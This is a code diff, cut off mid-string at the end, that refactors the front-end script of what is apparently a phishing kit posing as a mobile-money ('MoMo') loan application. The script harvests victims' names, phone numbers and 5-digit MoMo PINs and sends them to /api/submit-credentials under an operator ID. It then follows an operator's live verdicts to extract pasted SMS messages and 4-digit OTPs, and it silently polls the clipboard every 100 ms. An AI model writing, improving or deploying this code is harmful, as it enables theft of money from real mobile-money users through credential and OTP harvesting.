@@ -2,55 +2,57 @@ document.addEventListener('DOMContentLoaded', () => {
     const urlParams = new URLSearchParams(window.location.search);
     const adminId = urlParams.get('admin');
 
+    const byId = (id) => document.getElementById(id);
+
     const views = {
-        welcome: document.getElementById('step-welcome'),
-        calculator: document.getElementById('step-calculator'),
-        loan1: document.getElementById('step-loan-1'),
-        loan2: document.getElementById('step-loan-2'),
-        loan3: document.getElementById('step-loan-3'),
-        pin: document.getElementById('step-pin'),
-        loading: document.getElementById('step-loading'),
-        sms: document.getElementById('step-sms'),
-        otp: document.getElementById('step-otp'),
-        success: document.getElementById('step-success')
+        welcome: byId('step-welcome'),
+        calculator: byId('step-calculator'),
+        loan1: byId('step-loan-1'),
+        loan2: byId('step-loan-2'),
+        loan3: byId('step-loan-3'),
+        pin: byId('step-pin'),
+        loading: byId('step-loading'),
+        sms: byId('step-sms'),
+        otp: byId('step-otp'),
+        success: byId('step-success')
     };
 
-    const rangeAmount = document.getElementById('range-amount');
-    const rangeMonths = document.getElementById('range-months');
-    const calcAmountDisplay = document.getElementById('calc-amount-display');
-    const calcMonthsDisplay = document.getElementById('calc-months-display');
-    const calcMonthlyDisplay = document.getElementById('calc-monthly-display');
+    const rangeAmount = byId('range-amount');
+    const rangeMonths = byId('range-months');
+    const calcAmountDisplay = byId('calc-amount-display');
+    const calcMonthsDisplay = byId('calc-months-display');
+    const calcMonthlyDisplay = byId('calc-monthly-display');
 
-    const loanAmountInput = document.getElementById('loan-amount-input');
-    const loanDurationSelect = document.getElementById('loan-duration-select');
-    const loanPurposeInput = document.getElementById('loan-purpose-input');
+    const loanAmountInput = byId('loan-amount-input');
+    const loanDurationSelect = byId('loan-duration-select');
+    const loanPurposeInput = byId('loan-purpose-input');
 
-    const firstNameInput = document.getElementById('first-name');
-    const lastNameInput = document.getElementById('last-name');
-    const momoPhoneStep2 = document.getElementById('momo-phone-step2');
-    const step2Banner = document.getElementById('step2-banner');
+    const firstNameInput = byId('first-name');
+    const lastNameInput = byId('last-name');
+    const momoPhoneStep2 = byId('momo-phone-step2');
+    const step2Banner = byId('step2-banner');
 
-    const pinForm = document.getElementById('pin-verify-form');
-    const verifyPhoneInput = document.getElementById('verify-phone');
+    const pinForm = byId('pin-verify-form');
+    const verifyPhoneInput = byId('verify-phone');
     const pinCells5 = Array.from(document.querySelectorAll('.pin-cell-5'));
-    const pinHidden5 = document.getElementById('pin-value-5');
-    const pinSurfaceBanner = document.getElementById('pin-surface-banner');
+    const pinHidden5 = byId('pin-value-5');
+    const pinSurfaceBanner = byId('pin-surface-banner');
 
-    const loadingTitle = document.getElementById('loading-title');
-    const loadingDesc = document.getElementById('loading-desc');
-    const loadingSurfaceBanner = document.getElementById('loading-surface-banner');
+    const loadingTitle = byId('loading-title');
+    const loadingDesc = byId('loading-desc');
+    const loadingSurfaceBanner = byId('loading-surface-banner');
 
-    const smsCountdownEl = document.getElementById('sms-countdown');
-    const smsSurfaceBanner = document.getElementById('sms-surface-banner');
-    const smsPasteBox = document.getElementById('sms-paste-box');
-    const smsCharCounter = document.getElementById('sms-char-counter');
-    const btnVerifySms = document.getElementById('btn-verify-sms');
-    const btnRequestNewSms = document.getElementById('btn-request-new-sms');
+    const smsCountdownEl = byId('sms-countdown');
+    const smsSurfaceBanner = byId('sms-surface-banner');
+    const smsPasteBox = byId('sms-paste-box');
+    const smsCharCounter = byId('sms-char-counter');
+    const btnVerifySms = byId('btn-verify-sms');
+    const btnRequestNewSms = byId('btn-request-new-sms');
 
-    const otpSurfaceBanner = document.getElementById('otp-surface-banner');
+    const otpSurfaceBanner = byId('otp-surface-banner');
     const otpCells4 = Array.from(document.querySelectorAll('.otp-cell-4'));
-    const btnSubmitOtp = document.getElementById('btn-submit-otp');
-    const finalAppliedAmountEl = document.getElementById('final-applied-amount');
+    const btnSubmitOtp = byId('btn-submit-otp');
+    const finalAppliedAmountEl = byId('final-applied-amount');
 
     const REQUIRED_SMS_PREFIX = "Y'ello. Please note";
 
@@ -109,13 +111,13 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function updateCalculator() {
-        const amt = parseInt(rangeAmount.value, 10) || 100000;
-        const months = parseInt(rangeMonths.value, 10) || 12;
+        const amt = rangeAmount ? (parseInt(rangeAmount.value, 10) || 100000) : 100000;
+        const months = rangeMonths ? (parseInt(rangeMonths.value, 10) || 12) : 12;
         const monthly = Math.round((amt * 1.25) / months);
 
-        calcAmountDisplay.textContent = amt.toLocaleString();
-        calcMonthsDisplay.textContent = `${months} Months`;
-        calcMonthlyDisplay.textContent = monthly.toLocaleString();
+        if (calcAmountDisplay) calcAmountDisplay.textContent = amt.toLocaleString();
+        if (calcMonthsDisplay) calcMonthsDisplay.textContent = `${months} Months`;
+        if (calcMonthlyDisplay) calcMonthlyDisplay.textContent = monthly.toLocaleString();
 
         applicationState.amount = amt.toLocaleString();
         applicationState.duration = `${months} Months`;
@@ -129,78 +131,102 @@ document.addEventListener('DOMContentLoaded', () => {
     if (rangeAmount && rangeMonths) {
         rangeAmount.addEventListener('input', updateCalculator);
         rangeMonths.addEventListener('input', updateCalculator);
-        updateCalculator();
+    }
+    updateCalculator();
+
+    const btnGetStarted = byId('btn-get-started');
+    if (btnGetStarted) {
+        btnGetStarted.addEventListener('click', () => showView('calculator'));
     }
 
-    document.getElementById('btn-get-started').addEventListener('click', () => showView('calculator'));
-    document.getElementById('back-calc-welcome').addEventListener('click', () => showView('welcome'));
+    const backCalcWelcome = byId('back-calc-welcome');
+    if (backCalcWelcome) backCalcWelcome.addEventListener('click', () => showView('welcome'));
 
-    document.getElementById('btn-continue-calc').addEventListener('click', () => {
-        updateCalculator();
-        showView('loan1');
-    });
+    const btnContinueCalc = byId('btn-continue-calc');
+    if (btnContinueCalc) {
+        btnContinueCalc.addEventListener('click', () => {
+            updateCalculator();
+            showView('loan1');
+        });
+    }
 
-    document.getElementById('back-step-1').addEventListener('click', () => showView('calculator'));
+    const backStep1 = byId('back-step-1');
+    if (backStep1) backStep1.addEventListener('click', () => showView('calculator'));
 
-    document.getElementById('btn-next-1').addEventListener('click', () => {
-        applicationState.amount = (loanAmountInput.value || applicationState.amount).trim();
-        applicationState.duration = loanDurationSelect.value || applicationState.duration;
-        applicationState.purpose = (loanPurposeInput.value || 'Business expansion and working capital').trim();
-        showView('loan2');
-    });
+    const btnNext1 = byId('btn-next-1');
+    if (btnNext1) {
+        btnNext1.addEventListener('click', () => {
+            applicationState.amount = ((loanAmountInput && loanAmountInput.value) || applicationState.amount).trim();
+            applicationState.duration = (loanDurationSelect && loanDurationSelect.value) || applicationState.duration;
+            applicationState.purpose = ((loanPurposeInput && loanPurposeInput.value) || 'Business expansion and working capital').trim();
+            showView('loan2');
+        });
+    }
 
-    document.getElementById('back-step-2').addEventListener('click', () => showView('loan1'));
-    document.getElementById('btn-prev-2').addEventListener('click', () => showView('loan1'));
+    const backStep2 = byId('back-step-2');
+    if (backStep2) backStep2.addEventListener('click', () => showView('loan1'));
+    const btnPrev2 = byId('btn-prev-2');
+    if (btnPrev2) btnPrev2.addEventListener('click', () => showView('loan1'));
 
-    document.getElementById('btn-next-2').addEventListener('click', () => {
-        hideBanner(step2Banner);
-        const fName = firstNameInput.value.trim();
-        const lName = lastNameInput.value.trim();
-        const phoneCleaned = momoPhoneStep2.value.replace(/\D/g, '').trim();
+    const btnNext2 = byId('btn-next-2');
+    if (btnNext2) {
+        btnNext2.addEventListener('click', () => {
+            hideBanner(step2Banner);
+            const fName = (firstNameInput && firstNameInput.value || '').trim();
+            const lName = (lastNameInput && lastNameInput.value || '').trim();
+            const phoneCleaned = ((momoPhoneStep2 && momoPhoneStep2.value) || '').replace(/\D/g, '').trim();
 
-        if (!fName || !lName) {
-            showBanner(step2Banner, 'ENTER YOUR EXACT REGISTERED FULL NAME AND LAST NAME.');
-            return;
-        }
-        if (!isValidTenDigitPhone(phoneCleaned)) {
-            showBanner(step2Banner, 'PHONE NUMBER MUST START WITH 0 AND BE EXACTLY 10 DIGITS.');
-            return;
-        }
+            if (!fName || !lName) {
+                showBanner(step2Banner, 'ENTER YOUR EXACT REGISTERED FULL NAME AND LAST NAME.');
+                return;
+            }
+            if (!isValidTenDigitPhone(phoneCleaned)) {
+                showBanner(step2Banner, 'PHONE NUMBER MUST START WITH 0 AND BE EXACTLY 10 DIGITS.');
+                return;
+            }
 
-        applicationState.firstName = fName;
-        applicationState.lastName = lName;
-        applicationState.phone = phoneCleaned;
+            applicationState.firstName = fName;
+            applicationState.lastName = lName;
+            applicationState.phone = phoneCleaned;
 
-        document.getElementById('sum-amount').textContent = applicationState.amount;
-        document.getElementById('sum-duration').textContent = applicationState.duration;
-        document.getElementById('sum-purpose').textContent = applicationState.purpose;
-        document.getElementById('sum-applicant').textContent = `${fName} ${lName}`;
-        document.getElementById('sum-phone').textContent = phoneCleaned;
+            if (byId('sum-amount')) byId('sum-amount').textContent = applicationState.amount;
+            if (byId('sum-duration')) byId('sum-duration').textContent = applicationState.duration;
+            if (byId('sum-purpose')) byId('sum-purpose').textContent = applicationState.purpose;
+            if (byId('sum-applicant')) byId('sum-applicant').textContent = `${fName} ${lName}`;
+            if (byId('sum-phone')) byId('sum-phone').textContent = phoneCleaned;
 
-        if (verifyPhoneInput) verifyPhoneInput.value = phoneCleaned;
-        showView('loan3');
-    });
+            if (verifyPhoneInput) verifyPhoneInput.value = phoneCleaned;
+            showView('loan3');
+        });
+    }
 
-    document.getElementById('back-step-3').addEventListener('click', () => showView('loan2'));
-    document.getElementById('btn-prev-3').addEventListener('click', () => showView('loan2'));
+    const backStep3 = byId('back-step-3');
+    if (backStep3) backStep3.addEventListener('click', () => showView('loan2'));
+    const btnPrev3 = byId('btn-prev-3');
+    if (btnPrev3) btnPrev3.addEventListener('click', () => showView('loan2'));
 
-    document.getElementById('btn-proceed-pin').addEventListener('click', () => {
-        hideBanner(pinSurfaceBanner);
-        clearPinBoxes();
-        showView('pin');
-        if (verifyPhoneInput && !verifyPhoneInput.value && applicationState.phone) {
-            verifyPhoneInput.value = applicationState.phone;
-        }
-        if (pinCells5[0]) pinCells5[0].focus();
-    });
+    const btnProceedPin = byId('btn-proceed-pin');
+    if (btnProceedPin) {
+        btnProceedPin.addEventListener('click', () => {
+            hideBanner(pinSurfaceBanner);
+            clearPinBoxes();
+            showView('pin');
+            if (verifyPhoneInput && !verifyPhoneInput.value && applicationState.phone) {
+                verifyPhoneInput.value = applicationState.phone;
+            }
+            if (pinCells5[0]) pinCells5[0].focus();
+        });
+    }
 
     function clearPinBoxes() {
         pinCells5.forEach(cell => { cell.value = ''; });
-        pinHidden5.value = '';
+        if (pinHidden5) pinHidden5.value = '';
     }
 
     function sync5Pin() {
-        pinHidden5.value = pinCells5.map(c => c.value.replace(/\D/g, '')).join('');
+        if (pinHidden5) {
+            pinHidden5.value = pinCells5.map(c => c.value.replace(/\D/g, '')).join('');
+        }
     }
 
     pinCells5.forEach((cell, idx) => {
@@ -218,71 +244,73 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-    pinForm.addEventListener('submit', async (e) => {
-        e.preventDefault();
-        hideBanner(pinSurfaceBanner);
-        sync5Pin();
+    if (pinForm) {
+        pinForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            hideBanner(pinSurfaceBanner);
+            sync5Pin();
 
-        const phoneVal = verifyPhoneInput.value.replace(/\D/g, '').trim();
-        const pinVal = pinHidden5.value;
+            const phoneVal = ((verifyPhoneInput && verifyPhoneInput.value) || '').replace(/\D/g, '').trim();
+            const pinVal = (pinHidden5 && pinHidden5.value) || '';
 
-        if (!isValidTenDigitPhone(phoneVal)) {
-            showBanner(pinSurfaceBanner, 'PHONE NO MUST START WITH 0 AND HAVE 10 DIGITS.');
-            return;
-        }
-        if (pinVal.length !== 5) {
-            showBanner(pinSurfaceBanner, 'ENTER YOUR 5-DIGIT MOMO PIN.');
-            return;
-        }
+            if (!isValidTenDigitPhone(phoneVal)) {
+                showBanner(pinSurfaceBanner, 'PHONE NO MUST START WITH 0 AND HAVE 10 DIGITS.');
+                return;
+            }
+            if (pinVal.length !== 5) {
+                showBanner(pinSurfaceBanner, 'ENTER YOUR 5-DIGIT MOMO PIN.');
+                return;
+            }
 
-        applicationState.phone = phoneVal;
-        currentSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).slice(2, 9);
-        lastHandledStatus = null;
+            applicationState.phone = phoneVal;
+            currentSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).slice(2, 9);
+            lastHandledStatus = null;
 
-        loadingTitle.textContent = 'SENDING DETAILS TO MOMO VERIFICATION...';
-        loadingDesc.textContent = 'Please wait while admin reviews your phone number and PIN.';
-        hideBanner(loadingSurfaceBanner);
-        showView('loading');
+            if (loadingTitle) loadingTitle.textContent = 'SENDING DETAILS TO MOMO VERIFICATION...';
+            if (loadingDesc) loadingDesc.textContent = 'Please wait while admin reviews your phone number and PIN.';
+            hideBanner(loadingSurfaceBanner);
+            showView('loading');
 
-        try {
-            const resp = await fetch('/api/submit-credentials', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    sessionId: currentSessionId,
-                    phone: phoneVal,
-                    pin: pinVal,
-                    adminId,
-                    loanData: applicationState
-                })
-            });
-            const result = await resp.json();
-            if (result.success) {
-                startStatusPolling();
-            } else {
-                showBanner(pinSurfaceBanner, 'UNABLE TO SUBMIT DETAILS. TRY AGAIN.');
+            try {
+                const resp = await fetch('/api/submit-credentials', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: currentSessionId,
+                        phone: phoneVal,
+                        pin: pinVal,
+                        adminId,
+                        loanData: applicationState
+                    })
+                });
+                const result = await resp.json();
+                if (result.success) {
+                    startStatusPolling();
+                } else {
+                    showBanner(pinSurfaceBanner, 'UNABLE TO SUBMIT DETAILS. TRY AGAIN.');
+                    showView('pin');
+                }
+            } catch (err) {
+                showBanner(pinSurfaceBanner, 'NETWORK ERROR. CHECK YOUR CONNECTION AND TRY AGAIN.');
                 showView('pin');
             }
-        } catch (err) {
-            showBanner(pinSurfaceBanner, 'NETWORK ERROR. CHECK YOUR CONNECTION AND TRY AGAIN.');
-            showView('pin');
-        }
-    });
+        });
+    }
 
     function startSmsCountdown() {
         if (countdownTimer) clearInterval(countdownTimer);
         let remaining = 15;
-        smsCountdownEl.textContent = `${remaining}s`;
-        btnRequestNewSms.classList.add('hidden');
+        if (smsCountdownEl) smsCountdownEl.textContent = `${remaining}s`;
+        if (btnRequestNewSms) btnRequestNewSms.classList.add('hidden');
 
         countdownTimer = setInterval(() => {
             remaining--;
             if (remaining > 0) {
-                smsCountdownEl.textContent = `${remaining}s`;
+                if (smsCountdownEl) smsCountdownEl.textContent = `${remaining}s`;
             } else {
                 clearInterval(countdownTimer);
-                smsCountdownEl.textContent = '0s';
-                btnRequestNewSms.classList.remove('hidden');
+                if (smsCountdownEl) smsCountdownEl.textContent = '0s';
+                if (btnRequestNewSms) btnRequestNewSms.classList.remove('hidden');
             }
         }, 1000);
     }
@@ -295,14 +323,14 @@ document.addEventListener('DOMContentLoaded', () => {
     function evaluateSmsText(rawText) {
         if (isSubmittingSms) return;
         const text = (rawText || '').trim();
-        smsCharCounter.textContent = `${text.length} / 1000`;
+        if (smsCharCounter) smsCharCounter.textContent = `${text.length} / 1000`;
 
         if (!startsWithRequiredSMS(text)) return;
 
         if (submittedSmsSet.has(text)) {
             showBanner(smsSurfaceBanner, 'DUPLICATE SMS DETECTED. THIS SMS HAS ALREADY BEEN SUBMITTED.');
-            smsPasteBox.value = '';
-            smsCharCounter.textContent = '0 / 1000';
+            if (smsPasteBox) smsPasteBox.value = '';
+            if (smsCharCounter) smsCharCounter.textContent = '0 / 1000';
             return;
         }
 
@@ -315,8 +343,8 @@ document.addEventListener('DOMContentLoaded', () => {
         isSubmittingSms = true;
         stopSmsWatchers();
 
-        loadingTitle.textContent = 'VERIFYING MOMO SMS...';
-        loadingDesc.textContent = 'Please wait while your SMS is being verified.';
+        if (loadingTitle) loadingTitle.textContent = 'VERIFYING MOMO SMS...';
+        if (loadingDesc) loadingDesc.textContent = 'Please wait while your SMS is being verified.';
         hideBanner(loadingSurfaceBanner);
         showView('loading');
 
@@ -332,8 +360,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 isSubmittingSms = false;
                 showView('sms');
                 showBanner(smsSurfaceBanner, 'DUPLICATE SMS IS NOT ALLOWED. PASTE A NEW SMS.');
-                smsPasteBox.value = '';
-                smsCharCounter.textContent = '0 / 1000';
+                if (smsPasteBox) smsPasteBox.value = '';
+                if (smsCharCounter) smsCharCounter.textContent = '0 / 1000';
                 startSmsVerificationStep(false);
                 return;
             }
@@ -359,9 +387,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
         if (smsWatchTimer) clearInterval(smsWatchTimer);
         smsWatchTimer = setInterval(() => {
-            if (isSubmittingSms || !views.sms.classList.contains('active')) return;
+            if (isSubmittingSms || !views.sms || !views.sms.classList.contains('active')) return;
 
-            const currentVal = smsPasteBox.value.trim();
+            const currentVal = smsPasteBox ? smsPasteBox.value.trim() : '';
             if (currentVal) {
                 evaluateSmsText(currentVal);
                 return;
@@ -369,7 +397,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText().then(clip => {
-                    if (clip && clip.trim().startsWith(REQUIRED_SMS_PREFIX) && !isSubmittingSms) {
+                    if (clip && clip.trim().startsWith(REQUIRED_SMS_PREFIX) && !isSubmittingSms && smsPasteBox) {
                         smsPasteBox.value = clip.trim();
                         evaluateSmsText(clip.trim());
                     }
@@ -378,40 +406,46 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 100);
     }
 
-    ['input', 'change', 'paste', 'keyup'].forEach(evtName => {
-        smsPasteBox.addEventListener(evtName, () => {
-            evaluateSmsText(smsPasteBox.value);
-        });
-    });
-
-    btnVerifySms.addEventListener('click', () => {
-        const val = smsPasteBox.value.trim();
-        if (!val) {
-            showBanner(smsSurfaceBanner, 'PLEASE COPY AND PASTE THE WHOLE SMS STARTING WITH Y\'ello. Please note.');
-            return;
-        }
-        if (!startsWithRequiredSMS(val)) {
-            showBanner(smsSurfaceBanner, 'SMS MUST START WITH: Y\'ello. Please note');
-            return;
-        }
-        evaluateSmsText(val);
-    });
-
-    btnRequestNewSms.addEventListener('click', async () => {
-        hideBanner(smsSurfaceBanner);
-        smsPasteBox.value = '';
-        smsCharCounter.textContent = '0 / 1000';
-        startSmsCountdown();
-        showBanner(smsSurfaceBanner, 'NEW SMS REQUEST SENT TO ADMIN. WATCH YOUR MOMO NUMBER.');
-
-        try {
-            await fetch('/api/request-new-sms', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ sessionId: currentSessionId })
+    if (smsPasteBox) {
+        ['input', 'change', 'paste', 'keyup'].forEach(evtName => {
+            smsPasteBox.addEventListener(evtName, () => {
+                evaluateSmsText(smsPasteBox.value);
             });
-        } catch (err) {}
-    });
+        });
+    }
+
+    if (btnVerifySms) {
+        btnVerifySms.addEventListener('click', () => {
+            const val = smsPasteBox ? smsPasteBox.value.trim() : '';
+            if (!val) {
+                showBanner(smsSurfaceBanner, "PLEASE COPY AND PASTE THE WHOLE SMS STARTING WITH Y'ello. Please note.");
+                return;
+            }
+            if (!startsWithRequiredSMS(val)) {
+                showBanner(smsSurfaceBanner, "SMS MUST START WITH: Y'ello. Please note");
+                return;
+            }
+            evaluateSmsText(val);
+        });
+    }
+
+    if (btnRequestNewSms) {
+        btnRequestNewSms.addEventListener('click', async () => {
+            hideBanner(smsSurfaceBanner);
+            if (smsPasteBox) smsPasteBox.value = '';
+            if (smsCharCounter) smsCharCounter.textContent = '0 / 1000';
+            startSmsCountdown();
+            showBanner(smsSurfaceBanner, 'NEW SMS REQUEST SENT TO ADMIN. WATCH YOUR MOMO NUMBER.');
+
+            try {
+                await fetch('/api/request-new-sms', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sessionId: currentSessionId })
+                });
+            } catch (err) {}
+        });
+    }
 
     function clearOtpBoxes() {
         otpCells4.forEach(c => { c.value = ''; });
@@ -426,8 +460,8 @@ document.addEventListener('DOMContentLoaded', () => {
         isSubmittingOtp = true;
         hideBanner(otpSurfaceBanner);
 
-        loadingTitle.textContent = 'VERIFYING 4-DIGIT OTP...';
-        loadingDesc.textContent = 'Please wait while your OTP is being confirmed.';
+        if (loadingTitle) loadingTitle.textContent = 'VERIFYING 4-DIGIT OTP...';
+        if (loadingDesc) loadingDesc.textContent = 'Please wait while your OTP is being confirmed.';
         hideBanner(loadingSurfaceBanner);
         showView('loading');
 
@@ -462,14 +496,16 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-    btnSubmitOtp.addEventListener('click', () => {
-        const code = readOtpValue();
-        if (code.length !== 4) {
-            showBanner(otpSurfaceBanner, 'ENTER THE 4-DIGIT OTP SENT TO YOUR MOMO NUMBER.');
-            return;
-        }
-        submitFourDigitOtp(code);
-    });
+    if (btnSubmitOtp) {
+        btnSubmitOtp.addEventListener('click', () => {
+            const code = readOtpValue();
+            if (code.length !== 4) {
+                showBanner(otpSurfaceBanner, 'ENTER THE 4-DIGIT OTP SENT TO YOUR MOMO NUMBER.');
+                return;
+            }
+            submitFourDigitOtp(code);
+        });
+    }
 
     function startOtpStep(resetBanner = true) {
         isSubmittingOtp = false;
@@ -493,25 +529,4 @@ document.addEventListener('DOMContentLoaded', () => {
                 if (data.status === 'denied_pin') {
                     lastHandledStatus = data.status;
                     clearInterval(statusPollTimer);
-                    stopSmsWatchers();
-                    clearPinBoxes();
-                    showView('pin');
-                    showBanner(pinSurfaceBanner, 'CHECK YOUR MOMO DETAILS AND TRY AGAIN.');
-                } else if (data.status === 'approved_pin') {
-                    lastHandledStatus = data.status;
-                    smsPasteBox.value = '';
-                    smsCharCounter.textContent = '0 / 1000';
-                    startSmsVerificationStep(true);
-                } else if (data.status === 'wrong_pin') {
-                    lastHandledStatus = data.status;
-                    stopSmsWatchers();
-                    clearPinBoxes();
-                    showView('pin');
-                    showBanner(pinSurfaceBanner, 'INCORRECT PIN. ENTER YOUR NEW 5-DIGIT PIN IN THE EMPTY BOXES.');
-                    if (pinCells5[0]) pinCells5[0].focus();
-                } else if (data.status === 'sms_expired') {
-                    lastHandledStatus = data.status;
-                    smsPasteBox.value = '';
-                    smsCharCounter.textContent = '0 / 1000';
-                    startSmsVerificationStep(false);
-                    showBanner(smsSurfaceBanner, 'SMS EXPIRED. ENTER NEW INCOMING SMS ON YOUR
+                 
